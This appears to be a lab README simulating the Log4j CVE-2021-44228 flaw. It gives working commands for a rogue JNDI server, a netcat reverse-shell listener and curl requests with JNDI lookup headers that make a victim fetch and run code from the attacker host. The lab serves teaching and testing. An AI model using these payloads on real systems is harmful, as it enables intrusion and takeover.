# CVE-2021-44228 Simulation

* Vulnerability allows unauthenticated remote code execution
* An attacker who can control log messages or log message parameters can execute arbitrary code loaded from remote servers when `Message Lookups` is enabled.
* Log4j2 version <=2.14.0

## Set Up Lab Environment

* [Victim Server](../victim/README.md)
* [Attacker Server - Rogue JNDI](../attacker/README.md)


## Initialize Rogue JNDI

The IP address of my attacker VM is `192.168.2.6`. Therefore, I start `Rogue JNDI` with the following command:

```bash
docker run --rm -ti -e PAYLOAD_IP=192.168.2.6 -p 1389:1389 -p 8888:8888 rogue-jndi
```

## Start Netcat Listener

In the same attacker server, start a netcat listener to process the reverse shell:

```bash
nc -lvnp 443
```

## Trigger Vulnerability - API Mode

In the victim's server, run the following commands depending on how you want to retrieve and execute the reverse shell payload:

### Java Class Referenced

```bash
curl -X GET -H 'user-agent: ${jndi:ldap://192.168.2.6:1389/o=reference}' 127.0.0.1:8080/Log4j-2.14.0-SNAPSHOT/api
```

### Deserialized Payload

```bash
curl -X GET -H 'user-agent: ${jndi:ldap://192.168.2.6:1389/o=tomcat}' 127.0.0.1:8080/Log4j-2.14.0-SNAPSHOT/api
```

## References

* https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228
* https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/
* https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
* https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet
* https://github.com/mbechler/marshalsec
* https://codeql.github.com/codeql-query-help/java/java-jndi-injection/